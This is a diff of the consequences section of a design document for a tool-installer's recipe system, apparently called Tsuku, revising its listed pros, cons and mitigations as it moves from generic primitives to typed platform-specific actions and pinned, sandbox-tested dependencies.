+- Tiered consent for different risk levels
+- Audit logging requirements
 
 ## Consequences
 
 ### Positive
 
-- **Consistency**: Platform filtering uses `when` clause everywhere, not mixed mechanisms.
 - **Complete golden coverage**: All recipes can be sandbox-tested, including those with system dependencies.
-- **Composability**: Easy to mix action types per platform (download on Linux, require_system on macOS).
+- **Consistent filtering**: Platform filtering uses `when` clause with `distro` support everywhere.
+- **Typed actions**: Each action has a well-defined schema (from [DESIGN-system-dependency-actions.md](DESIGN-system-dependency-actions.md)).
+- **Composability**: Easy to mix action types per platform (download on Linux, brew_install on macOS).
 - **Explicit dependencies**: The minimal base container forces recipes to declare all required packages.
-- **Machine-executable**: Tsuku can install system dependencies automatically (with user consent).
-- **Auditable**: No shell commands - every operation uses a primitive that can be statically analyzed.
+- **Documentation generation**: Actions generate human-readable instructions via `Describe()`.
+- **Auditable**: No shell commands - every action can be statically analyzed.
 - **Content-addressed**: External resources are pinned by SHA256, preventing TOCTOU attacks.
-- **Extensible**: New primitives can be added as patterns emerge during recipe migration.
 
 ### Negative
 
-- **Verbosity**: Platform-specific steps duplicate `command` field across steps.
+- **Verbosity**: Platform-specific steps require separate action entries.
 - **Infrastructure**: Requires building and publishing minimal base container images.
-- **Primitive vocabulary**: Complex installations may require multiple primitives or new primitive types.
-- **Extension overhead**: New patterns require code changes to add primitives (by design, but adds friction).
+- **Action vocabulary**: Complex installations may require multiple actions or new action types.
+- **Two-design coordination**: This design depends on the action vocabulary design.
 
 ### Mitigations
 
 - **Verbosity**: Recipes are validated by tooling; explicit is better than implicit for platform behavior.
 - **Infrastructure**: GitHub Actions can build and publish base images on release.
-- **Primitive vocabulary**: Start with common patterns (apt, brew, dnf); add primitives as needed.
-- **Extension overhead**: The overhead is intentional - it creates a review gate for new operation types.
+- **Action vocabulary**: Start with common patterns (apt, brew, dnf); add actions as needed.
+- **Two-design coordination**: Clear scope boundaries and cross-references ensure designs stay aligned.
